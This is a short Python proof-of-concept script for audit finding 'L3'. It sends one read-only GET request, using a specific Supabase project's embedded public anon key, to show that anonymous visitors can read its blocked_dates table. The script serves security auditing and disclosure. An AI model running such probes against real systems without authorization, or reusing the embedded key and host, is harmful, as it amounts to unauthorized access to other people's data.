#!/usr/bin/env python3
"""
Read-only PoC for finding L3: an ANONYMOUS visitor (no login) can read public.blocked_dates.

Uses only the public anon key over the REST API — exactly what any unauthenticated
browser could do. No DB password, no user token, no writes.

  pip install requests
  python blocked_dates_check.py
"""
import requests

SUPABASE_URL = "https://jpjrhpagjevjkfezgnve.supabase.co"
ANON_KEY = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpwanJocGFnamV2amtmZXpnbnZlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg0MzQxMDAsImV4cCI6MjA5NDAxMDEwMH0."
    "hV90FeXDE55DnrfT7tSy4I-8H8cCKXuF66reGqexm30"
)
HEADERS = {"apikey": ANON_KEY, "Authorization": f"Bearer {ANON_KEY}"}


def main():
    print(f"GET {SUPABASE_URL}/rest/v1/blocked_dates  (anon key only, no login)\n")
    r = requests.get(
        f"{SUPABASE_URL}/rest/v1/blocked_dates",
        headers={**HEADERS, "Prefer": "count=exact"},
        params={"select": "*", "limit": "50"},
        timeout=15,
    )
    print(f"HTTP {r.status_code}")
    if r.status_code not in (200, 206):
        print(f"Not readable by anon: {r.text[:200]}")
        return

    total = r.headers.get("Content-Range", "?/?").split("/")[-1]
    rows = r.json()
    print(f">>> CONFIRMED: anon read {len(rows)} row(s) (table total: {total}) "
          f"with NO authentication.\n")
    for row in rows:
        print(f"  {row}")


if __name__ == "__main__":
    main()
